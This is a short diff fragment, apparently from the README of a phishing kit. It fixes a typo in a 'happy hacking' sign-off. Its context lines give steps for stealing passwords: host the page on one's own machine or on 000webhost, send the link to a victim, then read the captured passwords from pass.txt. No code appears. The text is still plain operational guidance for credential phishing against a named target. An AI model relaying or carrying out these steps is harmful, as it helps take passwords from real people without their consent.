@@ -5,4 +5,4 @@ host it in your machine (or) use free hosting site like 000webhost
 send the link to your victim
 open the pass.txt
 
-happy !!! hackingc;-)
+happy !!! hacking ;-)
